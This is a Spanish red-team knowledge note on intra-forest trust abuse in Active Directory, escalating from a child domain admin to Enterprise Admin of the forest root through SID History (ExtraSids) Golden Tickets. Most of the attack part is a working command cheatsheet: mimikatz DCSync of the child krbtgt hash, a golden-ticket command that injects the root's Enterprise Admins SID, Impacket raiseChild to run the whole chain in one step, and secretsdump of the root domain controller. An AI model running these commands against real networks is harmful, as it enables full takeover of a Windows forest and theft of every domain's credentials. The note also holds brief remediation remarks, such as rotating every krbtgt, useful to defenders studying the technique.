---
aliases:
  - Intra-Forest Trust Abuse
  - Child to Parent Domain
  - SID History Injection
  - ExtraSids Attack
tags:
  - technique/privilege-escalation
  - technique/lateral-movement
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Golden Ticket]]"
  - "[[DCSync]]"
  - "[[AD - Domain & Forest Trusts]]"
  - "[[Inter-Forest Trust Abuse]]"
---
# Intra-Forest Trust Abuse

Dentro de un **bosque**, todos los dominios confían entre sí (trusts transitivos parent-child) y comparten el grupo **Enterprise Admins** (vive en el dominio raíz). El límite de seguridad real es el **bosque, no el dominio**: comprometer un dominio hijo → escalar al **forest root** → control de todos los dominios.

La técnica principal: **SID History injection (ExtraSids)**. Con el hash de `krbtgt` del dominio hijo (= ya sos DA del hijo), forjás un Golden Ticket que incluye en `ExtraSids` el SID de **Enterprise Admins** del root → autenticás como EA en todo el bosque. Funciona porque **SID filtering NO se aplica intra-forest**.

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Get-DomainTrust` / `nltest /domain_trusts` | Mapa de trusts y dominio raíz | Recon de la jerarquía. |
| `lsadump::dcsync /domain:child.corp.local /user:child\krbtgt` | Hash krbtgt del dominio hijo (insumo) | Ya sos DA del hijo. |
| `Get-DomainSID -Domain corp.local` (root) y `Get-DomainGroup 'Enterprise Admins' -Domain corp.local` | SID del root + RID 519 (Enterprise Admins) | Para el ExtraSid. |
| `mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<CHILD_SID> /krbtgt:<HASH> /sids:<ROOT_SID>-519 /ptt` | Golden Ticket con SID History de Enterprise Admins | Escalada child → forest root. |
| `impacket-raiseChild child.corp.local/childadmin:Pass` | Auto: child DA → Enterprise Admin (toda la cadena) | One-shot Impacket. |
| `impacket-secretsdump -k -no-pass dc-root.corp.local` | DCSync del root con el ticket forjado | Validación / dump del root. |

```bash
# Impacket raiseChild hace todo: dcsync child krbtgt → golden con ExtraSid EA → dump root
impacket-raiseChild -target-exec dc-root.corp.local 'child.corp.local/Administrator:Pass123!'
```

---

## Overview

El error conceptual común es tratar cada dominio como un silo de seguridad. **No lo es**: dentro de un bosque, ser DA de cualquier dominio hijo te lleva a Enterprise Admin (root) porque:

- Los trusts intra-forest son bidireccionales y transitivos.
- **SID filtering está deshabilitado** intra-forest → el SID de EA inyectado en `ExtraSids` se respeta.
- El krbtgt del hijo es suficiente para forjar el ticket (no necesitás nada del root).

**Resultado:** un solo dominio hijo comprometido = bosque entero. Por eso el forest es el límite de seguridad y la remediación de un compromiso de bosque exige reconstruir/rotar todo (incluido cada krbtgt).

> [!tip] Pre-requisito
> Necesitás DA del dominio hijo (su krbtgt). A partir de ahí, ExtraSids es offline e inmediato. Para cross-**forest** (otro límite) ver [[Inter-Forest Trust Abuse]].

---

## Recursos

- [adsecurity.org — SID History / ExtraSids](https://adsecurity.org/?p=1640) — Sean Metcalf.
- [The Hacker Recipes — Forest = security boundary](https://www.thehacker.recipes/ad/movement/trusts) — intra-forest.
- [Impacket raiseChild](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) — automatización.
